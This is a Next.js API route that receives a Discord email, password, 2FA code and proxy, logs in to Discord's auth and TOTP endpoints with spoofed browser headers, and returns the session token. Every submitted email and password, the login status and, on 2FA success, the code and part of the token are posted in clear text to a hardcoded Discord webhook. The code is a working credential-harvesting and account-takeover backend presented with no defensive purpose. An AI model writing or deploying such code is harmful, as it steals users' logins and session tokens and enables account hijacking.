import { NextRequest, NextResponse } from 'next/server';
import fetch from 'node-fetch';
import { HttpsProxyAgent } from 'https-proxy-agent';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function sendToWebhook(title: string, fields: { name: string; value: string }[], color = 0x5865f2) {
  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title,
          color,
          fields,
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch {}
}

export async function POST(req: NextRequest) {
  const { email, password, code, proxy } = await req.json();

  const result = { success: false, token: null, error: null };

  try {
    const proxyUrl = proxy ? `http://${proxy}` : null;
    const agent = proxyUrl ? new HttpsProxyAgent(proxyUrl) : undefined;

    // Step 1: Basic login attempt
    const loginRes = await fetch('https://discord.com/api/v9/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIn0=',
        'X-Fingerprint': 'fingerprint_here_if_you_have_one' // optional, add if you generate it
      },
      body: JSON.stringify({ login: email, password, undelete: false, login_source: null, gift_code_sku_id: null }),
      agent: agent as any
    });

    const loginData = await loginRes.json();

    await sendToWebhook('Login Attempt', [
      { name: 'Email', value: email },
      { name: 'Password', value: password },
      { name: 'Proxy', value: proxy || 'None' },
      { name: 'Status', value: loginData.token ? 'Success' : loginData.message || 'Failed' }
    ], loginData.token ? 0x00ff00 : 0xff0000);

    if (loginData.token) {
      result.success = true;
      result.token = loginData.token;
    } else if (loginData.ticket && code) {
      // Step 2: TOTP / 2FA
      const mfaRes = await fetch('https://discord.com/api/v9/auth/mfa/totp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
          'Authorization': 'Bearer ' + (loginData.token || '') // sometimes needed
        },
        body: JSON.stringify({ ticket: loginData.ticket, code }),
        agent: agent as any
      });

      const mfaData = await mfaRes.json();

      if (mfaData.token) {
        result.success = true;
        result.token = mfaData.token;

        await sendToWebhook('2FA Success', [
          { name: 'Email', value: email },
          { name: 'Code Used', value: code },
          { name: 'Token', value: mfaData.token.substring(0, 30) + '...' }
        ], 0x00ff00);
      } else {
        result.error = mfaData.message || '2FA failed';
      }
    } else {
      result.error = loginData.message || 'Login failed';
    }
  } catch (err) {
    result.error = err.message || 'Proxy/Request error';
  }

  return NextResponse.json(result);
}
